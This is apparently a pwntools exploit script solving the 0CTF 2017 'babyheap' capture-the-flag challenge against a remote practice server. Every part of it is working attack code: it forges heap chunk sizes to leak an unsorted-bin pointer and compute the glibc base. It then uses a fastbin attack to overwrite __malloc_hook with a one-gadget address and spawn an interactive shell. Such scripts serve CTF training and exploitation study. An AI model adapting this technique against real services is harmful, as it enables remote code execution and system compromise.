#!/usr/bin/python3.6
from pwn import *

filename = './babyheap_0ctf_2017'
elf = ELF(filename)
# p = process(filename)
p = remote("node3.buuoj.cn", 26153)

def logfunc(f):
    def wrap(*args, **kwargs):
        log.debug(f'func={f.__name__}, args={args}, kwargs={kwargs}')
        return f(*args, **kwargs)
    return wrap

unsrt_offset = 0x3c4b78
gadget_offset= 0x4526a
malloc_hook_offset = 0x3c4b10

@logfunc
def alloc(size, flag=False):
    p.recvuntil(b'Command: ')
    p.sendline(b'1')
    p.recvuntil(b'Size: ')
    p.sendline(str(size).encode())
    if flag:
        c = p.recv(64)
        log.warning(c)
        p.recvuntil(b'Allocate Index ')
        index = p.recvuntil(b'\n')
        log.info(f'Allocate Index={index}')

@logfunc
def fill(index, content, size=None):
    p.recvuntil(b'Command: ')
    p.sendline(b'2')
    p.recvuntil(b'Index: ')
    p.sendline(str(index).encode())
    p.recvuntil(b'Size: ')
    p.sendline(str(size or len(content)).encode())
    p.recvuntil(b'Content: ')
    p.sendline(content)

@logfunc
def free(index):
    p.recvuntil(b'Command: ')
    p.sendline(b'3')
    c = p.recvuntil(b'Index: ')
    p.sendline(str(index).encode())

@logfunc
def dump(index):
    p.recvuntil(b'Command: ')
    p.sendline(b'4')
    p.recvuntil(b'Index: ')
    p.sendline(str(index).encode())
    p.recvuntil(b'Content: \n')

alloc(0x10)  # 0   
alloc(0x10)  # 1
alloc(0xa0)  # 2 
alloc(0x10)  # 3

fill(0, 
    b'a'*0x10 + \
    p64(0) + p64((0x30 + 0x10) | 0x1)
    )   # Fake chunk size
fill(2, 
    b'b'*0x10 + \
    p64(0) + p64((0xa0-(0x30-0x10)) | 0x1)
    )   # Bypass nextchunk check
free(1)
alloc(0x30)
fill(1, b'c' * 0x10 + \
    p64(0) + p64((0xa0 + 0x10) | 0x1))  # Restore
free(2)
dump(1) 

content = p.recv(0x30)
unsorted_fd, unsorted_bk = u64(content[0x20:0x20+8]), u64(content[-8:])
log.info(f'unsorted fd={hex(unsorted_fd)}; bk={hex(unsorted_bk)}')

assert unsorted_fd == unsorted_bk

glibc_base = unsorted_fd - unsrt_offset
gadget_addr= gadget_offset + glibc_base
malloc_hook= malloc_hook_offset + glibc_base

log.info(f'base={hex(glibc_base)}; gadget={hex(gadget_addr)}; &hook={hex(malloc_hook)}')

alloc(0x10) # 2

alloc(0x10)     # 4
alloc(0x60)     # 5

free(5)
fake_chunk = malloc_hook - 0x23
log.info(f'fake={hex(fake_chunk)}')
fill(4, b'd'*0x10 + p64(0) + p64(0x71) + p64(fake_chunk))

alloc(0x60)     # 5

alloc(0x60)     # 6
fill(6, b'e' * (0x23 - 0x10) + p64(gadget_addr))

alloc(0x10)
p.interactive()
